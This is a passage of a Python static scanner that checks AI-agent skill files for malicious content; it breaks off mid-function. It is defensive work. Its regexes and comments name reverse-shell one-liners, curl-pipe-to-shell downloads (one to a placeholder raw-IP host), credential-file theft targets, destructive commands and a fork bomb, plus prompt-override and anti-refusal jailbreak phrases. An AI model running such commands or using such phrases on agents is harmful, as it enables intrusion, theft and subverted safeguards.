"""Deterministic, static safety scanner for skill content (SKILL.md body + frontmatter).

**Why this exists.** After the ClawHavoc supply-chain attack (Feb 2026 — 800+ malicious skills
on a competing registry, one with 340k installs that silently shipped the Atomic macOS Stealer
plus a cryptominer), "is this skill *safe*?" became the first question any skill registry has to
answer. Skills are markdown instructions, not executable code, so our attack surface is far
smaller than a code marketplace's — but a skill body can still:

  1. carry a **live committed credential** (an API key pasted into an example),
  2. instruct an agent to **fetch and execute** a remote payload (`curl … | sh`),
  3. instruct an agent to **open a reverse shell** (`bash -i >& /dev/tcp/…`),
  4. instruct an agent to **exfiltrate** secrets / keychain / SSH keys / wallets to a host, or
  5. **hide instructions** with zero-width or bidirectional unicode (a "Trojan Source" attack).

This scanner catches those, deterministically, with **no LLM call** — it's a pure function over
text, so it's fast, free, reproducible, and unit-testable. It is the engine behind the registry's
universal trust signal: every skill (verified or not, high-lift or zero-lift) carries a scan
result, which is the one thing a competitor running an unvetted directory cannot show.

**The design constraint that makes this non-trivial.** Skills that *document* these patterns
(a secret-scanner prints `AKIA[0-9A-Z]{16}`; a prompt-injection guide contains "ignore previous
instructions" as the thing to *resist*) must not be blocked. So the scanner is **context-aware**:
it separates documentation (fenced code, regex patterns, example/placeholder tokens, security-skill
category) from live payloads, and redacts any secret it finds rather than echoing it. The hard
*block* decision is left to the caller; this module only classifies.

**This is the open-source extraction of the DecimalAI registry's first-pass static scanner.** It
is a pure function — no DB, no network, no LLM, standard-library only — so the exact same engine
runs in the registry publish gate, the ``skillevaluation scan`` / ``decimalai skills scan`` local
commands, and CI. Those copies are meant to stay identical, and ``SCANNER_VERSION`` is the drift
check: a scan result carrying a newer version than yours means this copy is behind. Local scans
read frontmatter (``category``, ``allowed-tools``, trigger phrases); when those are absent, local
results may be *stricter* than the server (a security skill without ``category: security`` in its
frontmatter can flag locally yet pass the gate) — advisory, never looser.
"""

from __future__ import annotations

import re
from datetime import datetime, timezone
from typing import Any

# Bump when detection logic changes so stored results are comparable and a
# backfill can re-scan everything below the current version.
# v2 (2026-06-13): decode-and-execute (base64/openssl/xxd → shell,
#                  exec(b64decode)) added; closes the ClawHavoc staged-payload miss.
# v3 (2026-07-05): second wave of behavioral checks — added ssrf_metadata, agent_snooping,
#                  anti_refusal, destructive_commands, unicode_homoglyph,
#                  tool_overreach, trigger_abuse; per-finding remediation; the talk's
#                  4-group taxonomy (CHECK_GROUPS). All new behavioral checks are
#                  doc-downgradable. Calibrate against a real skill corpus and
#                  measure the false-positive rate before enabling enforcement.
SCANNER_VERSION = "4"

# Severity ladder. The caller maps status → action (block / warn / show).
CRITICAL = "critical"
WARNING = "warning"
INFO = "info"

# Status, derived from the worst finding: a CRITICAL blocks, a WARNING flags,
# INFO-only (or nothing) is clean. "unscanned" is the column default before a
# scan has ever run; this module never returns it.
STATUS_CLEAN = "clean"
STATUS_FLAGGED = "flagged"
STATUS_BLOCKED = "blocked"
VALID_STATUSES = (STATUS_CLEAN, STATUS_FLAGGED, STATUS_BLOCKED, "unscanned")


# ── Provider-specific secret patterns ─────────────────
# Mirrors the table taught by the official `secret-scanner` skill — we run, on
# publish, exactly the checks that skill teaches users to run on their repos
# (dogfooding the registry's own security content). Concrete values only: each
# pattern requires literal alphanumerics, so a skill that documents the *regex*
# (which contains `[`, `{`, `\`) never self-matches. Example/placeholder values
# are excluded separately below.
_SECRET_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    ("AWS access key", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("GitHub PAT (classic)", re.compile(r"\bghp_[A-Za-z0-9]{36}\b")),
    ("GitHub PAT (fine-grained)", re.compile(r"\bgithub_pat_[A-Za-z0-9_]{82}\b")),
    ("GitHub app token", re.compile(r"\bgh[opsu]_[A-Za-z0-9]{36}\b")),
    ("GitLab PAT", re.compile(r"\bglpat-[A-Za-z0-9_\-]{20}\b")),
    ("Slack token", re.compile(r"\bxox[baprs]-[0-9A-Za-z\-]{10,}\b")),
    ("Stripe secret key (live)", re.compile(r"\bsk_live_[A-Za-z0-9]{24,}\b")),
    ("OpenAI key", re.compile(r"\bsk-(?:proj-)?[A-Za-z0-9]{40,}\b")),
    ("Anthropic key", re.compile(r"\bsk-ant-api03-[A-Za-z0-9_\-]{90,}\b")),
    ("Google API key", re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b")),
    ("Sendgrid key", re.compile(r"\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b")),
    ("Twilio account SID", re.compile(r"\bAC[a-f0-9]{32}\b")),
    # Require real key material after the header — a documented/quoted header
    # alone ("scan for -----BEGIN RSA PRIVATE KEY-----") is not a leak.
    (
        "Private key block",
        re.compile(
            r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----[\r\n]+[A-Za-z0-9+/=\s]{100,}"  # noqa: E501
        ),
    ),
]

# DB connection URLs with an embedded password are only WARNING-worthy, not a
# block: published skills overwhelmingly carry *template* DSNs
# (`postgres://user:password@localhost:5432/db`), not live credentials, so
# blocking on them is almost all false positives. Flag (caution), never hide.
_DB_URL_WITH_PASSWORD = re.compile(
    r"\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis)://[^\s:@/]+:[^\s:@/]+@[^\s/]+"
)
# Template hosts/creds that mark a DSN as an example, not a leak.
_DB_URL_TEMPLATE = re.compile(
    r"(?i)@(?:localhost|127\.0\.0\.1|db|database|host|postgres|mysql|example|0\.0\.0\.0|\$|\{)"
    r"|//(?:user|username|root|postgres|admin):(?:pass(?:word)?|secret|changeme|root|postgres)@"
)

# Tokens that mark a "secret-looking" match as a placeholder/example, not a leak.
_SECRET_EXAMPLE_MARKERS = re.compile(
    r"(?i)(example|sample|placeholder|your[_\-]?|my[_\-]?|xxx+|redact|dummy|fake|test|\bn/?a\b|"
    r"\b0{6,}|\bdeadbeef|123456|abcdef|changeme|<[^>]+>|\{\{|\}\}|\bnotreal)"
)

# Remote-code-execution. NOTE: bare "fetch a URL and pipe to a shell" is handled
# separately (see `_PIPE_TO_SHELL` + the scan body) because `curl https://tool.dev/
# install | bash` is a *documented* install method for many real tools — it earns a
# caution (WARNING) by default and only escalates to CRITICAL for a suspicious URL.
# The patterns BELOW are the ones that are almost always malicious regardless of
# host: decode-and-execute (no legit installer pipes decoded base64 into a shell —
# this is the ClawHavoc staged-payload technique), python that execs fetched/
# decoded content, or os.system shelling out to curl. (Homebrew/Chocolatey-style
# `bash -c "$(curl …)"` / `iex(…DownloadString)` ARE documented installers and are
# handled URL-aware in `_DOWNLOAD_EXEC` instead.)
_RCE_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    # Decode-and-execute: `echo <b64> | base64 -d | bash`, `curl … | base64 -d | sh`,
    # `openssl enc -d … | bash`, `xxd -r … | sh` — decode straight into a shell.
    (
        "decode-pipe-to-shell",
        re.compile(
            r"(?i)\b(?:base64\s+(?:-d|--decode|-D)|openssl\s+enc[^\n|]*?-d|xxd\s+-r)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|k)?sh\b"
        ),
    ),
    ("python decode→exec", re.compile(r"(?i)\b(?:exec|eval)\s*\(\s*[^)\n]*\bb(?:ase)?64\b")),
    ("python fetch→exec", re.compile(r"(?i)\bexec\s*\(\s*(?:requests\.get|urllib|urlopen)")),
    ("python os.system download", re.compile(r"(?i)\bos\.system\s*\([^\n]*\b(?:curl|wget)\b")),
]

# "Fetch a remote script and execute it" across its common forms — pipe-to-shell,
# `bash -c "$(curl …)"`, PowerShell `iex(…DownloadString(URL))`. Each captures the
# fetch args so we can judge the URL: WARNING by default (these ARE the documented
# installers for Homebrew, rustup, bun, chocolatey, scoop, …), CRITICAL only when
# the URL hides its destination (raw IP / shortener / non-HTTPS) — the
# staged-download payload shape from ClawHavoc.
_DOWNLOAD_EXEC: list[tuple[str, re.Pattern[str]]] = [
    (
        "pipe-to-shell",
        re.compile(r"(?i)\b(?:curl|wget|fetch)\b([^\n|]*)\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b"),
    ),
    (
        "shell -c $(curl …)",
        re.compile(r"(?i)\b(?:ba|z|k)?sh\s+-c\s+[\"']?\$\(\s*(?:curl|wget)([^)]*)\)"),
    ),
    (
        "powershell IEX(web)",
        re.compile(
            r"(?i)\b(?:iex|invoke-expression)\b[^\n]*?(?:downloadstring|invoke-webrequest|iwr|new-object\s+net\.webclient)([^\n]*)"
        ),
    ),
]

# Reverse-shell one-liners.
_REVERSE_SHELL_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    (
        "bash /dev/tcp reverse shell",
        re.compile(r"(?i)(?:ba)?sh\s+-i\b[^\n]*>&?\s*/dev/(?:tcp|udp)/"),
    ),
    ("/dev/tcp redirect", re.compile(r"/dev/(?:tcp|udp)/\d{1,3}(?:\.\d{1,3}){3}/\d+")),
    ("netcat -e shell", re.compile(r"(?i)\bn(?:c|cat)\b[^\n]*-e\s*/(?:bin|usr)")),
    (
        "python socket reverse shell",
        re.compile(r"(?i)socket\.socket\([^\n]*\n?[^\n]*(?:dup2|/bin/(?:ba)?sh)"),
    ),
]

# Sensitive sources an exfiltration payload reaches for. Scoped tightly to the
# AMOS/ClawHavoc *credential-theft* targets — SSH keys, cloud-cred files,
# keychains, browser cred stores, crypto wallets, package-registry tokens. We
# deliberately EXCLUDE `process.env` / `os.environ` / bare `.env`: reading an env
# var to authenticate an API call (`Bearer {os.environ['X_API_KEY']}`) is normal
# integration code, not exfiltration, and including it floods the gate with false
# positives on legitimate connector skills (mailchimp, linkedin, …).
_SENSITIVE_SOURCE = re.compile(
    r"(?i)(~/\.ssh/id_|id_rsa\b|id_ed25519\b|\.aws/credentials|\.config/gcloud|\.azure/|"
    r"login\.keychain|Keychains?/|/Cookies\b|Login\s+Data|wallet\.dat|MetaMask|Exodus|"
    r"keystore\b|/etc/shadow|\.npmrc\b|\.pypirc\b|\.docker/config\.json)"
)
# Egress sinks the payload sends to.
_EGRESS_SINK = re.compile(
    r"(?i)\b(?:curl|wget|fetch|requests\.(?:post|put)|http[s]?\.request|invoke-webrequest|"
    r"upload|POST\s+http|nc\b|mail\s+-s|sendmail)\b"
)

# Obfuscation: zero-width / bidirectional unicode that can hide instructions.
# Bidi CONTROLS split by risk (2026-07-09 calibration):
#  - OVERRIDES/EMBEDDINGS U+202A–U+202E (LRE/RLE/PDF/LRO/RLO): the classic Trojan
#    Source reordering vector, essentially never legitimate in a skill body →
#    CRITICAL, non-downgradable.
#  - ISOLATES U+2066–U+2069 (LRI/RLI/FSI/PDI): the Unicode-RECOMMENDED mechanism
#    for embedding an LTR run inside RTL text — legitimate localization content
#    ships these — but still mildly dual-use → WARNING, treated like zero-width
#    (flagged, skipped inside code). A skill using BOTH still blocks on the
#    override match. (A legit bidi skill should name them as U+2068… rather than
#    embed live controls; escaping them clears even the WARNING.)
_BIDI_OVERRIDE = re.compile("[‪-‮]")  # Trojan Source override/embed — never legit
_BIDI_ISOLATE = re.compile("[⁦-⁩]")   # bidi isolates — legit for RTL, dual-use
_ZERO_WIDTH = re.compile("[​-‏⁠-⁤﻿]")
# Long opaque base64/hex blob — a staged payload smells like this.
_OPAQUE_BLOB = re.compile(r"\b[A-Za-z0-9+/]{240,}={0,2}\b|\b(?:[0-9a-fA-F]{2}){120,}\b")

# URL shorteners + raw-IP URLs (obscure the real destination of a fetch).
_SHORTENER = re.compile(
    r"(?i)https?://(?:bit\.ly|tinyurl\.com|t\.co|goo\.gl|is\.gd|cutt\.ly|rb\.gy|shorturl\.|rebrand\.ly)/"
)
_RAW_IP_URL = re.compile(r"(?i)https?://\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?/")

# Prompt-injection phrasing directed at the reading agent. INFO only — noisy by
# nature (a skill *about* injection contains these), never blocks.
_INJECTION_PHRASE = re.compile(
    r"\b(?:ignore|disregard|forget)\b[^.\n]{0,40}\b(?:previous|prior|above|earlier|all)\b"
    r"[^.\n]{0,30}\b(?:instructions?|prompts?|rules?|directions?)\b"
    r"|\byou\s+are\s+now\b[^.\n]{0,40}\b(?:dan|jailbroken|unrestricted|developer\s+mode)\b"
    r"|\[\s*(?:SYSTEM|ADMIN|OVERRIDE)\s*\]",
    re.IGNORECASE,
)

# Markers that a region is teaching/defending against a pattern rather than
# instructing the agent to run it. Used to downgrade behavioral CRITICALs.
_DOC_MARKERS = re.compile(
    r"(?i)\b(?:detect|avoid|never|refuse|do\s+not|don't|malicious|attack|exploit|vulnerab|"
    r"example\s+of|for\s+example|e\.g\.|red[\s\-]?team|threat|payload\s+looks|warning\s+sign|"
    # review/danger-documentation vocabulary (2026-07-09) — a schema-migration /
    # DB-audit / safety-review skill QUOTES a destructive command as the hazard it
    # guards against; these words signal teaching-about-risk, not instructing it.
    # Only downgrades CRITICAL→WARNING (still flagged), never clears.
    r"hazard|irreversible|destructive|destroy|unsafe|dangerous|rollback|down[\s\-]?time|data\s+loss|"
    r"red\s+flag|reject|block|prohibited|forbidden|illustrat)\b"
)
_SECURITY_CATEGORIES = {"security", "safety", "compliance"}

# ── What a "documentation" downgrade may excuse, and what it may not ──────────
#
# A downgrade can feed on TWO signals, and only one of them is evidence:
#
#   * the ±400-char doc-marker window — CONTENT-local. The payload has to sit next
#     to teaching language ("example of", "detect", "never", "malicious"). This is
#     the calibration that lets a `secret-scanner` / injection-resistance skill
#     publish, and it is the false positive the downgrade was built for.
#   * `category in {security, safety, compliance}` — a free-form string the AUTHOR
#     types into their own frontmatter. Uncorroborated, and true anywhere in the body.
#
# Letting the second one downgrade every behavioral CRITICAL makes the whole
# behavioral tier opt-out: a body carrying a reverse shell PLUS
# `curl http://<raw-ip>/p.sh | bash` PLUS a 169.254.169.254 read goes from `blocked`
# to `flagged` by adding one line of frontmatter, content untouched. An author-supplied
# field must never be the last lever over a block decision on that author's content.
#
# So the category signal is scoped to the DUAL-USE checks it was actually
# calibrated for, the ones whose matches are overwhelmingly quotation: a forensics
# skill lists `rm -rf /` in a denylist, a jailbreak-resistance skill contains the
# literal "you have no restrictions", a config-audit skill reads `~/.claude/`. It
# can no longer touch the checks that are never legitimate as an INSTRUCTION. Those
# keep the content-local doc-marker window — a security skill that genuinely teaches
# a reverse shell still downgrades, it just has to say so in the prose next to the
# payload instead of in a field it picks for itself.
_CATEGORY_DOWNGRADABLE = {"destructive_commands", "agent_snooping", "anti_refusal"}

# Checks that NO context downgrades — not the doc-marker window, not the category.
# `ssrf_metadata` is CRITICAL and never downgradable: a downgradable rule here would
# let `category: security` or nearby "example of" prose smuggle a metadata-SSRF into
# an executable bundle.
NON_DOWNGRADABLE_CHECKS = {"ssrf_metadata"}

# ── v3 checks (2026-07-05) — curated from the SkillSpector taxonomy + the
#    "skills marketplace for safety" talk. All doc-downgradable (behave like the
#    RCE/reverse-shell family) so a security skill teaching these isn't blocked.

# SSRF / metadata + local-secret endpoints. In a skill body these are near-never
# legitimate (an agent doesn't need the cloud metadata service or /proc/environ).
# CRITICAL, but doc-downgradable — the benchmark pre-execution denylist stays a
# SEPARATE, unconditional second layer for the executable bundle, so a skill that
# talks its way past this scanner still cannot execute the request.
_SSRF_METADATA: list[tuple[str, re.Pattern[str]]] = [
    (
        "cloud metadata endpoint",
        re.compile(
            r"(?i)(?:\b169\.254\.169\.254\b|metadata\.google\.internal|metadata\.azure\.com|\b100\.100\.100\.200\b)"
        ),
    ),
    ("process environ read", re.compile(r"/proc/(?:\d+|self)/environ\b")),
]

# Agent-config snooping — reading another agent's config / installed skills / MCP
# manifest to exfiltrate or shadow them. WARNING, doc-downgradable.
_AGENT_SNOOP = re.compile(
    r"(?i)\b(?:cat|read|open|less|more|type|get-content|find|grep|ls)\b[^\n]{0,40}?"
    r"(?:\.claude/|\.codex/|\.gemini/|\.cursor/|\bmcp\.json\b|\.mcp\.json\b)"
)

# Anti-refusal / jailbreak instructions aimed at the reading agent. WARNING,
# doc-downgradable (a jailbreak-resistance skill quotes these).
_ANTI_REFUSAL = re.compile(
    r"(?i)(?:\bnever\s+refuse\b|"
    # "do not refuse" must be UNCONDITIONAL to read as a jailbreak — a plain
    # "don't refuse outright if the sources support it" (a legit RAG instruction)
    # is not. Require an any/anything/a-request/to-<verb> object.
    r"\bdo\s*n['o]?t\s+refuse\s+(?:any(?:thing|\s+request)?\b|a\s+request\b|to\s+(?:answer|comply|help|do|provide|assist|respond)\b)|"
    r"\bignore\s+(?:your\s+|all\s+)?(?:safety|ethical|content)\s+(?:guidelines?|rules?|guardrails?|policies)|"
    r"\byou\s+have\s+no\s+(?:restrictions?|limits?|guardrails?|rules?)\b|"
    r"\bwithout\s+(?:any\s+)?(?:restrictions?|disclaimers?|warnings?|refusals?)\b|"
    r"\bdo\s*n['o]?t\s+(?:add|include|give|provide)\s+(?:any\s+)?(?:disclaimers?|warnings?|caveats?)\b)"
)

# Production-destructive shell / SQL. WARNING (doc-downgradable) — the talk's
# lesson: don't treat all commands as equally risky, so these are a caution, not a
# block, and a scoped/local form is deliberately excluded.
_DESTRUCTIVE: list[tuple[str, re.Pattern[str]]] = [
    # Only the near-zero-FP forms: recursive-force delete AT a root level (not ~/…),
    # raw-device writes, mkfs, unscoped DROP/TRUNCATE/DELETE, fork bomb. Common
    # everyday commands (rm -rf ~/.cache, git push --force to a branch) are left
    # out on purpose — the talk's lesson to not treat all commands as equally risky.
    (
        "rm -rf at a root level",
        re.compile(r"(?i)\brm\s+-[a-z]*[rf][a-z]*\s+(?:/(?![A-Za-z0-9_])|--no-preserve-root)"),
    ),
    ("dd to a raw device", re.compile(r"(?i)\bdd\b[^\n]*\bof=/dev/(?:sd|nvme|disk|hd|mmcblk)")),
    ("mkfs on a device", re.compile(r"(?i)\bmkfs(?:\.\w+)?\s+/dev/")),
    # (?<![\w-]) so hyphenated English ("hard-delete from primary DB") and words
    # containing the keyword don't read as a SQL statement — only a real
    # `DELETE FROM users` / `DROP TABLE x` does.
    (
        "unscoped DROP/TRUNCATE/DELETE",
        re.compile(
            r"(?i)(?<![\w-])(?:DROP\s+(?:TABLE|DATABASE|SCHEMA)|TRUNCATE\s+TABLE|DELETE\s+FROM\s+\w+)\b(?![^;]*\bWHERE\b)"
        ),
    ),
    ("fork bomb", re.compile(r":\(\)\s*\{\s*:\s*\|\s*:")),
]

# Mixed-script homoglyphs — a Cyrillic/Greek look-alike hidden inside an otherwise
# ASCII command/URL token (e.g. `аpt` with a Cyrillic 'а'). Bidi/zero-width are
# handled separately above; this catches confusable-letter swaps.
_CYR_GREEK = re.compile(r"[Ѐ-ӿͰ-Ͽ]")
_ASCII_LETTER = re.compile(r"[A-Za-z]")

# Trigger phrases engineered to win routing on everything (activation-maximizing).
# INFO only — a hygiene nudge, never a block.
_TRIGGER_ABUSE = {
    "always",
    "any",
    "anything",
    "everything",
    "all",
    "*",
    "any task",
    "all tasks",
    "every task",
    "any request",
    "all requests",
    "everything else",
    "whenever",
    "any time",
}


def _pipe_to_shell_is_suspicious(cmd_fragment: str) -> bool:
    """A fetch-pipe-to-shell is suspicious (→ CRITICAL) when its URL hides the
    destination: non-HTTPS, a raw-IP host, or a URL shortener. A plain
    `https://vendor.dev/install | bash` is a documented install pattern → WARNING.
    """
    frag = cmd_fragment or ""
    if _SHORTENER.search(frag) or _RAW_IP_URL.search(frag):
        return True
    # Any http:// (non-TLS) URL in the fetch is suspicious.
    if re.search(r"(?i)\bhttp://", frag):
        return True
    return False


def _line_of(text: str, idx: int) -> int:
    return text.count("\n", 0, idx) + 1


def _redact(value: str) -> str:
    """Never persist a real secret. Keep a short identifying prefix, mask the rest."""
    value = value.strip()
    if len(value) <= 8:
        return value[:2] + "…"
    return value[:4] + "…" + value[-2:] + f" ({len(value)} chars)"


def _fenced_code_spans(body: str) -> list[tuple[int, int]]:
    """Return (start, end) char spans of fenced code blocks (``` or ~~~)."""
    spans: list[tuple[int, int]] = []
    for m in re.finditer(r"(?ms)^[ \t]*(```|~~~).*?^[ \t]*\1[ \t]*$", body):
        spans.append((m.start(), m.end()))
    return spans


def _in_spans(idx: int, spans: list[tuple[int, int]]) -> bool:
    return any(s <= idx < e for s, e in spans)


def _looks_like_documentation(
    *, check: str, category: str | None, body: str, match_start: int,
    code_spans: list[tuple[int, int]]
) -> bool:
    """Heuristic: is this match teaching about a pattern, not instructing it?

    True when the surrounding prose carries doc markers ("example of", "detect",
    "never", "malicious", …) within ±400 chars — the guard that keeps a
    `secret-scanner` / injection-resistance skill from being blocked. For the
    dual-use checks in ``_CATEGORY_DOWNGRADABLE``, a security/safety/compliance
    ``category`` also counts; for everything else it does not, and for
    ``NON_DOWNGRADABLE_CHECKS`` nothing does. See the note on those two sets.

    ``check`` is required: the answer depends on WHICH finding is asking.
    """
    if check in NON_DOWNGRADABLE_CHECKS:
        return False
    if check in _CATEGORY_DOWNGRADABLE and (category or "").strip().lower() in _SECURITY_CATEGORIES:
        return True
    # Window of ±400 chars around the match for nearby doc language, MINUS any
    # framing the caller generated itself.
    #
    # Why the subtraction: a caller scanning a multi-file bundle usually concatenates the
    # files into one reviewable text with a separator line naming each file. That separator
    # lands a few dozen characters from the content — inside this window — so unless it is
    # stripped, the AUTHOR-CHOSEN FILENAME decides the verdict: byte-identical reverse-shell
    # content scores `blocked` under `scripts/run.sh` and merely `flagged` under
    # `scripts/detect.sh`, because "detect" is a doc marker. `references/threats.md` and
    # `scripts/block-attack.sh` are the same trick.
    #
    # The rule this encodes: a scanner must never read its own attribution header as
    # testimony about the thing it is attributing.
    lo = max(0, match_start - 400)
    hi = min(len(body), match_start + 400)
    if _DOC_MARKERS.search(_strip_caller_framing(body[lo:hi])):
        return True
    return False


# Separator lines a caller wraps around content it did not author. Matched
# whole-line, so a line of real prose that merely mentions an attachment is untouched.
_CALLER_FRAMING = re.compile(r"(?m)^---\s*attachment:.*?---\s*$")


def _strip_caller_framing(window: str) -> str:
    """Blank out caller-generated separator lines inside a doc-marker window.

    Replaced with spaces rather than removed so offsets within the window are stable
    for anything that inspects them afterwards.
    """
    return _CALLER_FRAMING.sub(lambda m: " " * len(m.group(0)), window)


# Per-check remediation guidance — a stable "how to fix" string attached to every
# finding, so whatever surfaces it (a publish gate's UI, this CLI, a SARIF report) can
# show an actionable next step, not just a description. Stdlib-only (plain dict), so it
# travels with the scanner wherever the package is installed.
CHECK_REMEDIATION = {
    "live_secret": "Remove the credential from the skill and rotate it. Reference secrets via an environment variable or a secret manager — never inline a live key.",  # noqa: E501
    "remote_code_execution": "Remove any step that downloads-and-runs or decodes-then-executes code. A skill must not run unreviewed remote or encoded payloads.",  # noqa: E501
    "reverse_shell": "Remove the reverse-shell / network-callback command — a skill must never open a shell back to a remote host.",  # noqa: E501
    "data_exfiltration": "Remove the step that reads a sensitive file or credential and sends it off-host. Don't pair a sensitive path with an upload/network sink.",  # noqa: E501
    "obfuscated_unicode": "Remove hidden bidirectional or zero-width unicode so the visible text and the actual instructions are identical.",  # noqa: E501
    "opaque_blob": "Replace the long opaque base64/hex blob with readable content, or move it to a reviewed file and explain what it is.",  # noqa: E501
    "suspicious_url": "Use a full canonical HTTPS URL instead of a shortener or raw IP, so reviewers can see where it points.",  # noqa: E501
    "prompt_injection_phrasing": "Rephrase instructions that tell the agent to ignore prior instructions or drop its safety rules — they read as prompt injection.",  # noqa: E501
}


def _finding(
    check: str, severity: str, message: str, *, evidence: str = "", line: int = 0
) -> dict[str, Any]:
    f: dict[str, Any] = {"check": check, "severity": severity, "message": message}
    if evidence:
        f["evidence"] = evidence[:160]
    if line:
        f["line"] = line
    remediation = CHECK_REMEDIATION.get(check)
    if remediation:
        f["remediation"] = remediation
    return f


def _homoglyph_candidates(body: str, code_spans: list[tuple[int, int]]) -> list[tuple[int, str]]:
    """(start, text) tokens to check for mixed-script homoglyphs — every URL plus
    each fenced code span (where a disguised command would hide)."""
    out: list[tuple[int, str]] = []
    for m in re.finditer(r"(?i)\bhttps?://\S+", body):
        out.append((m.start(), m.group(0)))
    for s, e in code_spans:
        out.append((s, body[s:e]))
    return out


def _check_tool_overreach(allowed_tools: Any) -> list[dict[str, Any]]:
    """WARNING when ``allowed_tools`` grants a wildcard / everything — the talk's
    over-broad-permission signal. Accepts a list or a comma/space string."""
    if not allowed_tools:
        return []
    if isinstance(allowed_tools, str):
        tools = [t.strip() for t in re.split(r"[,\s]+", allowed_tools) if t.strip()]
    else:
        tools = [str(t).strip() for t in allowed_tools if str(t).strip()]
    lowered = {t.lower() for t in tools}
    if lowered & {"*", "all", "any", "*:*", "everything"}:
        return [
            _finding(
                "tool_overreach",
                WARNING,
                "Declares a wildcard tool grant (all tools). Scope allowed-tools to just what the "
                "skill needs, so it can't reach unrelated capabilities.",
                evidence=", ".join(tools)[:80],
            )
        ]
    return []


# The checks we advertise as run, in display order. Surfaced in the API so the
# detail page can show "scanned for: …" — transparency is part of the trust pitch.
CHECKS_PERFORMED = [
    "live_secret",
    "remote_code_execution",
    "reverse_shell",
    "data_exfiltration",
    "ssrf_metadata",
    "agent_snooping",
    "anti_refusal",
    "destructive_commands",
    "obfuscated_unicode",
    "unicode_homoglyph",
    "opaque_blob",
    "suspicious_url",
    "tool_overreach",
    "trigger_abuse",
    "prompt_injection_phrasing",
]

# Display grouping for the "scanned for" list (the talk's four-group taxonomy).
# Kept separate from CHECKS_PERFORMED so the checks array stays a plain string list
# (consumers read it as-is); this maps check name → group for the UI/docs.
CHECK_GROUPS = {
    "prompt_injection_phrasing": "instructions",
    "anti_refusal": "instructions",
    "trigger_abuse": "instructions",
    "remote_code_execution": "commands",
    "reverse_shell": "commands",
    "destructive_commands": "commands",
    "live_secret": "data_credentials",
    "data_exfiltration": "data_credentials",
    "agent_snooping": "data_credentials",
    "ssrf_metadata": "data_credentials",
    "opaque_blob": "data_credentials",
    "obfuscated_unicode": "data_credentials",
    "unicode_homoglyph": "data_credentials",
    "suspicious_url": "data_credentials",
    "tool_overreach": "tools",
}


def scan_skill_content(
    body_markdown: str,
    *,
    name: str = "",
    description: str = "",
    category: str | None = None,
    allowed_tools: list[str] | None = None,
    trigger_phrases: list[str] | None = None,
) -> dict[str, Any]:
    """Statically scan a skill's content and return a structured safety result.

    Pure function — no DB, no network, no LLM. Returns a dict suitable for JSON
    storage in ``Skill.safety_scan`` (see also the ``status`` for the denormalized
    ``Skill.safety_status`` column)::

        {
          "scanned_at": "...Z", "scanner_version": "1",
          "status": "clean|flagged|blocked",
          "summary": "No issues found." | "1 critical, 2 warnings",
          "checks": [...],            # what we looked for (transparency)
          "findings": [{check, severity, message, evidence?, line?}],
          "counts": {"critical": 0, "warning": 1, "info": 0},
        }

    Secrets are redacted in ``evidence`` — the raw value is never returned or stored.
    """
    body = body_markdown or ""
    haystack = "\n".join(p for p in (name, description, body) if p)
    code_spans = _fenced_code_spans(body)
    findings: list[dict[str, Any]] = []

    # 1. Live secrets — scan name+description+body. Exclude regex-pattern matches
    #    (metachars) and example/placeholder values. Documentation context does
    #    NOT excuse a *concrete* credential, but our skills only print patterns.
    for label, pat in _SECRET_PATTERNS:
        for m in pat.finditer(haystack):
            val = m.group(0)
            window = haystack[max(0, m.start() - 30) : m.end() + 30]
            if _SECRET_EXAMPLE_MARKERS.search(window):
                continue
            findings.append(
                _finding(
                    "live_secret",
                    CRITICAL,
                    f"Looks like a live {label} committed in the skill text. "
                    "Remove it and rotate the credential before publishing.",
                    evidence=f"{label}: {_redact(val)}",
                    line=_line_of(body, body.find(val)) if val in body else 0,
                )
            )

    # DB connection strings with an embedded password → WARNING, not block:
    # almost all are template DSNs (user:password@localhost). Skip the obvious
    # templates entirely; flag the rest as a caution worth a human glance.
    for m in _DB_URL_WITH_PASSWORD.finditer(haystack):
        if _DB_URL_TEMPLATE.search(m.group(0)) or _SECRET_EXAMPLE_MARKERS.search(m.group(0)):
            continue
        findings.append(
            _finding(
                "live_secret",
                WARNING,
                "Database connection string with an embedded password — make sure this is a "
                "placeholder, not a live credential.",
                evidence=_redact(m.group(0)),
                line=_line_of(body, body.find(m.group(0))) if m.group(0) in body else 0,
            )
        )

    # 2/3/4. Behavioral payloads — RCE, reverse shell, exfiltration. These are the
    #    "is this skill malicious?" signals. CRITICAL when the skill instructs the
    #    agent to do it; downgraded to WARNING when it's clearly documentation
    #    (security skill, or fenced+doc-markers) so we never block defenders.
    def _behavioral(
        patterns: list[tuple[str, re.Pattern[str]]],
        check: str,
        noun: str,
        *,
        base: str = CRITICAL,
        downgraded: str = WARNING,
        instruction_suffix: str = " — a skill must not instruct an agent to do this.",
    ) -> None:
        for label, pat in patterns:
            for m in pat.finditer(body):
                doc = _looks_like_documentation(
                    check=check, category=category, body=body,
                    match_start=m.start(), code_spans=code_spans,
                )
                sev = downgraded if doc else base
                suffix = (
                    " (documented as an example — recorded, not blocked)"
                    if doc
                    else instruction_suffix
                )
                findings.append(
                    _finding(
                        check,
                        sev,
                        f"{noun} pattern ({label}){suffix}",
                        evidence=m.group(0),
                        line=_line_of(body, m.start()),
                    )
                )

    _behavioral(_RCE_PATTERNS, "remote_code_execution", "Remote code execution")
    _behavioral(_REVERSE_SHELL_PATTERNS, "reverse_shell", "Reverse shell")

    # Download-and-execute (pipe-to-shell, `sh -c "$(curl …)"`, PowerShell
    # IEX-web): WARNING by default (it executes remote code — worth a caution
    # badge, and these are the documented installers for Homebrew/rustup/bun/…),
    # CRITICAL only when the URL hides its destination. Doc context still
    # downgrades CRITICAL→WARNING so a security skill can show it as an example.
    _seen_dlx: set[int] = set()
    for _label, _pat in _DOWNLOAD_EXEC:
        for m in _pat.finditer(body):
            if m.start() in _seen_dlx:  # don't double-count overlapping forms
                continue
            _seen_dlx.add(m.start())
            suspicious = _pipe_to_shell_is_suspicious(m.group(1) if m.groups() else "")
